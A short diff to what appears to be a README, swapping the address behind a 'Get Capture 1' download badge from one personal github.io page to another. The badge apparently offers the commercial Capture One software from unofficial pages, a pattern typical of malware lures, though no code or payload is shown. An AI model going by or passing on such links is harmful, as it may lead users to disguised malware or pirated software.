@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://petapixel.com/assets/uploads/2025/05/Capture-One-Secondary-Logo-Black.jpg)
 
-[![Get Capture 1](https://img.shields.io/badge/Get_Capture_1-Now-0a5d8d?style=for-the-badge&logo=github)](https://seezmelilwj.github.io/.github/capture-1)
+[![Get Capture 1](https://img.shields.io/badge/Get_Capture_1-Now-0a5d8d?style=for-the-badge&logo=github)](https://asrafali6140.github.io/.github/capture-1)
 
 ---
 
